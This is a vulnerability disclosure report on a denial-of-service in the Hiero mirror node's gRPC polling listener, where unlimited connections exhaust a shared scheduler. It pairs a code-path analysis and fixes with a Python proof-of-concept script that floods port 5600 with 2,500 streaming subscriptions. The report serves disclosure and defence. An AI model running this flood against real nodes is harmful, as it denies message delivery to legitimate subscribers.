### Title
Unbounded gRPC Connections Exhaust Shared `boundedElastic()` Scheduler in `PollingTopicListener`, Starving Legitimate Subscribers

### Summary
`PollingTopicListener.listen()` schedules each subscriber's periodic polling loop on the JVM-wide `Schedulers.boundedElastic()` singleton. Because the gRPC server enforces only a per-connection call cap (`maxConcurrentCallsPerConnection = 5`) with no limit on the total number of inbound connections, an unprivileged attacker can open an arbitrary number of TCP connections and saturate the shared thread pool, causing all legitimate subscribers' polls to queue and stall.

### Finding Description
**Exact code path:**

`PollingTopicListener.java` line 31 allocates a single, JVM-wide `Schedulers.boundedElastic()` instance as a field:
```java
private final Scheduler scheduler = Schedulers.boundedElastic();
```
Every call to `listen()` (lines 34–48) attaches that scheduler to the `delaySubscription` and `repeatWhen` operators:
```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .withFixedDelay(interval)
                .withScheduler(scheduler))   // ← shared scheduler
```
Each active subscription therefore submits a new task to `boundedElastic()` every `interval` (default 500 ms). `Schedulers.boundedElastic()` defaults to `10 × availableProcessors` threads (e.g. 40 threads on a 4-core host) and a 100,000-task queue.

**Root cause / failed assumption:**
`GrpcConfiguration.java` (lines 32–33) only configures `maxConcurrentCallsPerConnection`:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
`NettyProperties.java` (line 14) defaults this to `5`. There is **no** `maxConnections`, `maxConnectionAge`, or per-IP limit set anywhere in the gRPC server configuration. An attacker can open an unlimited number of TCP connections, each carrying 5 concurrent streaming RPCs, yielding an unbounded total subscription count.

**Exploit flow:**
1. Attacker opens *K* TCP connections to port 5600 (no authentication required).
2. Each connection issues 5 `subscribeTopic` streaming RPCs → *5K* concurrent `listen()` invocations.
3. Each invocation schedules a DB-polling task on the shared `boundedElastic()` every 500 ms.
4. At *K* = 400 connections (2,000 subscriptions), the scheduler receives 4,000 tasks/second. With 40 threads and even a 10 ms DB round-trip, throughput is ~4,000 tasks/second — already at saturation.
5. Beyond saturation, tasks queue; legitimate subscribers' polls are delayed by seconds or indefinitely.

**Why existing checks are insufficient:**
- `maxConcurrentCallsPerConnection = 5` limits calls *per connection* but imposes no ceiling on the number of connections.
- No IP-based rate limiting or connection-count throttle exists in the gRPC layer.
- `ListenerProperties` has no `maxSubscriptions` field.
- The `boundedElastic()` queue (100,000 tasks) absorbs the flood silently before tasks are dropped, masking the problem until severe latency is observed.

### Impact Explanation
When `hiero.mirror.grpc.listener.type=POLL` is configured, all subscribers share one scheduler. Scheduler saturation causes polling delays proportional to queue depth, meaning every legitimate subscriber receives messages late or not at all until the attacker disconnects. No economic damage occurs, but real-time topic message delivery — the core service guarantee — is degraded for all users on the node.

### Likelihood Explanation
The attack requires only a standard gRPC client library and network access to port 5600; no credentials, tokens, or on-chain funds are needed. A single attacker machine can open thousands of TCP connections. The attack is trivially repeatable and scriptable. The only prerequisite is that the operator has set `listener.type=POLL` (non-default but a documented and supported option).

### Recommendation
1. **Limit total inbound connections** in `GrpcConfiguration`: call `serverBuilder.maxConnectionAge(...)` and add a custom `maxConnections` guard (e.g. via a Netty `ChannelHandler` or a `ServerInterceptor` that tracks active streams).
2. **Use a dedicated, bounded scheduler** instead of the JVM-wide singleton:
   ```java
   private final Scheduler scheduler = Schedulers.newBoundedElastic(
       Math.max(4, Runtime.getRuntime().availableProcessors()),
       1000,   // task queue cap
       "poll-listener");
   ```
   This isolates the polling scheduler from the rest of the application and makes exhaustion explicit (tasks rejected rather than silently queued).
3. **Add a global subscription counter** in `TopicMessageServiceImpl` and reject new subscriptions above a configurable threshold.
4. **Apply per-IP connection rate limiting** at the load-balancer or via a gRPC `ServerInterceptor`.

### Proof of Concept
```python
# Requires: pip install grpcio
import grpc, threading, time
from concurrent.futures import ThreadPoolExecutor

# proto stubs for ConsensusService.subscribeTopic
import consensus_pb2, consensus_pb2_grpc, timestamp_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # 500 connections × 5 streams = 2500 subscriptions

def flood(i):
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(ch)
    req = consensus_pb2.ConsensusTopicQuery(
        topicID=consensus_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0)
    )
    streams = [stub.subscribeTopic(req) for _ in range(5)]
    # Keep streams open to hold scheduler slots
    for s in streams:
        try:
            for _ in s: pass
        except: pass

with ThreadPoolExecutor(max_workers=CONNECTIONS) as ex:
    futs = [ex.submit(flood, i) for i in range(CONNECTIONS)]
    time.sleep(60)   # hold for 60 s; observe legitimate subscriber latency spike
```
With `listener.type=POLL` active, legitimate subscriber poll latency will increase from ~500 ms to several seconds within the 60-second window as the `boundedElastic()` queue fills.
